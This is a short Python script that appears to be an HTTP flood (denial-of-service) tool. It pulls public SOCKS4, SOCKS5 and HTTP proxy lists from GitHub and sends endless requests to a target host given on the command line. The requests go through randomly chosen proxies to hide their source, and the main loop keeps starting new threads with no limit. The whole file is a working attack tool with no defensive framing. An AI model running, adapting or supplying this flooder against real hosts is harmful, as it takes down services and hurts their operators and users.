import sys
import requests
from threading import Thread
import random

url_socks_three = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
url_socks_two = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"
url_socks_one = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"

response_one = requests.get(url_socks_one)
response_two = requests.get(url_socks_two)
response_three = requests.get(url_socks_three)

def worker(worker_id, host):
    while True:
        try:
            proxies_one = response_one.text.split("\n")
            proxies_two = response_two.text.split("\n")
            proxies_three = response_three.text.split("\n")
            random_proxy_socks_one = random.choice(proxies_one)
            random_proxy_socks_two = random.choice(proxies_two)
            random_proxy_socks_three = random.choice(proxies_three)
            requests.get(host,proxies={'http': 'socks5://'+random_proxy_socks_one})
            requests.get(host,proxies={'http': 'socks4://'+random_proxy_socks_two})
            requests.get(host,proxies={'http': 'http://'+random_proxy_socks_three})
            chack = requests.get(host,proxies={'http': 'http://'+random_proxy_socks_one})
            print(chack.status_code)
                 
        except requests.exceptions.RequestException as e:
            print(e)

def main():
    args_length = len(sys.argv)

    if args_length < 2:
        print('Error: No hostname provided. Add hostname as first argument.')
        sys.exit(1)
    host = sys.argv[1]

    if args_length < 3:
        sys.exit(1)

    try:
        workers = int(sys.argv[2])
    except ValueError:
        print("Error: No number of workers (threads) provided. Add number of workers as second argument.")
        sys.exit(1)
    threads = []
    while True:
        for i in range(workers):
            proxies = response_one.text.split("\n")
            random_proxy_socks = random.choice(proxies)
            print("Starting Worker", i, random_proxy_socks)
            thread = Thread(target=worker, args=(i, host))
            thread.start() 
    print("Waiting for Workers to finish")
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
